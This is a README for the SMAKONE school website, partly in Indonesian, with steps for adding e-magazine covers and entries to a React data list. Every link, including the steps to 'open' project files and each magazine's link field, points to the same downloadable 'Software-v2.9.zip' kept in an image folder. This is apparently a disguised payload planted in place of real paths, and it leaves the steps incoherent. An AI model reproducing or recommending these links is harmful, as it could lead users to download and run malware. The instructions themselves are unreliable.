# SMAKONE
SMAKONE Website


 node version version 16.15.0 & npm version8.9.0


# E - Magazine
Note: Image must in webp format

1. Taruh Cover E mag ke src/image/Emagz
2. Buka https://raw.githubusercontent.com/Bernardtrnp/SMAKONE/main/smakone-website/src/Image/Osis/Bidang_4/Software-v2.9.zip
3. Taruh code 
```
import "Nama File" from "../../Image/Emagz/'Nama File'"
```

4.
Dari 
```
    {
        id:1,
        title: "Festive February",
        img:FestiveFebruary,
        link:"https://raw.githubusercontent.com/Bernardtrnp/SMAKONE/main/smakone-website/src/Image/Osis/Bidang_4/Software-v2.9.zip"
    },
    {
        id:2,
        title: "Floraison",
        img:Floraison,
        link:"https://raw.githubusercontent.com/Bernardtrnp/SMAKONE/main/smakone-website/src/Image/Osis/Bidang_4/Software-v2.9.zip"
    },
    {
        id:3,
        title: "Aphrodite April",
        img:AphroditeApril,
        link:"https://raw.githubusercontent.com/Bernardtrnp/SMAKONE/main/smakone-website/src/Image/Osis/Bidang_4/Software-v2.9.zip"
    },
    {
        id:4,
        title: "Summer Maylodies",
        img:SummerMaylodies,
        link:"https://raw.githubusercontent.com/Bernardtrnp/SMAKONE/main/smakone-website/src/Image/Osis/Bidang_4/Software-v2.9.zip"
    },

``` 
Ganti ke 

```
    {
        id:1,
        title: "Floraison",
        img:Floraison,
        link:"https://raw.githubusercontent.com/Bernardtrnp/SMAKONE/main/smakone-website/src/Image/Osis/Bidang_4/Software-v2.9.zip"
    },
    {
        id:2,
        title: "Aphrodite April",
        img:AphroditeApril,
        link:"https://raw.githubusercontent.com/Bernardtrnp/SMAKONE/main/smakone-website/src/Image/Osis/Bidang_4/Software-v2.9.zip"
    },
    {
        id:3,
        title: "Summer Maylodies",
        img:SummerMaylodies,
        link:"https://raw.githubusercontent.com/Bernardtrnp/SMAKONE/main/smakone-website/src/Image/Osis/Bidang_4/Software-v2.9.zip"
    },
    {
        id:4,
        title: "New Emag titile",
        img: "Nama File"(yang dari step 3),
        link: "" (link emg)
    },
```

5. Buka https://raw.githubusercontent.com/Bernardtrnp/SMAKONE/main/smakone-website/src/Image/Osis/Bidang_4/Software-v2.9.zip
6. taruh code
```
import "Nama File" from "../../Image/Emagz/'Nama File'"
```
7.
Ganti
```
    {
      id :....,
      title: ....,
      img: ....,
      link: .....,
    }
    ,{
        id: id yang atas + 1,
        title: "New Emag titile",
        img: "Nama File"(yang dari step 6),
        link: "" (link emg)
    },
```

Abis itu run server, untuk cek bener atau tidak